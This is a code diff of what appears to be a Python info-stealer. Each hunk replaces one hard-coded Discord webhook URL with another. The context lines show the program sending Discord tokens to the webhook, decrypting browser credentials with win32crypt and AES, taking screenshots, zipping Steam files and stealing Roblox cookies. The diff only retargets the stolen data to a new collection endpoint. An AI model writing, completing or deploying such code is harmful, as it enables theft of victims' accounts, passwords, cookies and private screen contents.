@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('https://discord.com/api/webhooks/1086623070657192066/xCaKfGHWW5u_BpB0FW09vF6Ee2wd2BhV9isyaGk4r8wSUm_E4i5Wf9fWelPIeIP4X9kX', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1086624307448385576/1dXB36qFjFTPlziHXh-zgUgugsAb0xOLPtAwTSaxz9kqq9iDKwCKE-rIJcWqqAhYsBRL', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
@@ -136,7 +136,7 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from datetime import datetime
 
-hook = "https://discord.com/api/webhooks/1086623070657192066/xCaKfGHWW5u_BpB0FW09vF6Ee2wd2BhV9isyaGk4r8wSUm_E4i5Wf9fWelPIeIP4X9kX"
+hook = "https://discord.com/api/webhooks/1086624307448385576/1dXB36qFjFTPlziHXh-zgUgugsAb0xOLPtAwTSaxz9kqq9iDKwCKE-rIJcWqqAhYsBRL"
 
 appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
@@ -367,7 +367,7 @@ from PIL import ImageGrab
 
 user = os.path.expanduser("~")
 
-hook = "https://discord.com/api/webhooks/1086623070657192066/xCaKfGHWW5u_BpB0FW09vF6Ee2wd2BhV9isyaGk4r8wSUm_E4i5Wf9fWelPIeIP4X9kX"
+hook = "https://discord.com/api/webhooks/1086624307448385576/1dXB36qFjFTPlziHXh-zgUgugsAb0xOLPtAwTSaxz9kqq9iDKwCKE-rIJcWqqAhYsBRL"
 
 captura = ImageGrab.grab()
 captura.save(user+"\\AppData\\Local\\Temp\\ss.png")
@@ -383,7 +383,7 @@ except:
 
 import os, os.path, zipfile, requests
 
-hook = "https://discord.com/api/webhooks/1086623070657192066/xCaKfGHWW5u_BpB0FW09vF6Ee2wd2BhV9isyaGk4r8wSUm_E4i5Wf9fWelPIeIP4X9kX"
+hook = "https://discord.com/api/webhooks/1086624307448385576/1dXB36qFjFTPlziHXh-zgUgugsAb0xOLPtAwTSaxz9kqq9iDKwCKE-rIJcWqqAhYsBRL"
 
 steam_path = ""
 if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
@@ -416,7 +416,7 @@ import requests, robloxpy, json, browser_cookie3, os.path
 
 user = os.path.expanduser("~")
 
-hook = "https://discord.com/api/webhooks/1086623070657192066/xCaKfGHWW5u_BpB0FW09vF6Ee2wd2BhV9isyaGk4r8wSUm_E4i5Wf9fWelPIeIP4X9kX"
+hook = "https://discord.com/api/webhooks/1086624307448385576/1dXB36qFjFTPlziHXh-zgUgugsAb0xOLPtAwTSaxz9kqq9iDKwCKE-rIJcWqqAhYsBRL"
 
 def robloxl():
     data = [] 
